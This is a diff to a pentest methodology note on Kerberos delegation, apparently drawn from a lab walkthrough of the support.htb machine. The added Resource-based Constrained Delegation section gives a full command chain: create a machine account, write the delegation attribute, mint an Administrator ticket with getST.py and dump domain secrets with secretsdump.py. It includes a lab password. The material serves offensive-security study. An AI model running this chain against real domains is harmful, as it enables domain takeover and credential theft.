@@ -4,7 +4,7 @@ Kerberos Delegation allows a service to impersonate a user to access another res
 
 ### Unconstrained delegation
 
-This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.
+This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC and saved in memory in LSASS. So, if you have Administrator privileges on the machine, you will be able to dump the tickets and impersonate the users on any machine.
 
 So if a domain admin logins inside a Computer with "Unconstrained Delegation" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc)
 
@@ -52,11 +52,66 @@ Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowed
 ### Resource-based Constrained Delegation
 
 
-his is similar to the basic [Constrained Delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html) but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
 
-he constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
+- In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
 
-Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (In the other forms of Delegation you needed domain admin privs).
+- In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.
+
+the constrained object will have an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity` with the name of the AD object that can impersonate any other user against it. meaning **I trust these account(s) to impersonate any user when they authenticate to me.**
+
+
+
+1. Write access over the target object  
+You need GenericAll / GenericWrite / WriteProperty / WriteDACL / WriteOwner on the resource Confirm in BloodHound (outbound rights) or:
+
+
+```bash
+nxc ldap $TARGET -u support -p 'Ironside47pleasure40Watchful' --query "(sAMAccountName=DC$)" "nTSecurityDescriptor"
+```
+
+2. Can you create a computer account? (MachineAccountQuota > 0)  
+Check the quota:
+
+
+```bash
+nxc ldap $TARGET -u support -p 'Ironside47pleasure40Watchful' -M maq
+```
+
+Then actually create it (this both tests permission and sets you up):
+
+```bash
+addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Passw0rd123!' \
+  -dc-host dc.support.htb support.htb/support:'Ironside47pleasure40Watchful'
+```
+
+Success = `Successfully added machine account`. If quota is 0, use an existing SPN-holding account you control instead.
+
+```bash
+echo '10.129.38.148 dc.support.htb support.htb dc' | sudo tee -a /etc/hosts
+```
+
+3. Clocks synced
+
+```bash
+sudo ntpdate 10.129.38.148        # or: sudo rdate -n 10.129.38.148
+```
+
+exploit
+```sh
+# Write the delegation attribute (needs step 1)
+rbcd.py -delegate-to 'DC$' -delegate-from 'FAKE01$' -action write \
+  support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.129.38.148
+
+# Mint the impersonation ticket (needs steps 2-4)
+getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator \
+  support.htb/'FAKE01$':'Passw0rd123!' -dc-ip 10.129.38.148
+
+export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+
+# Use it
+secretsdump.py -k -no-pass dc.support.htb
+```
+
 ### References 
 
 https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13
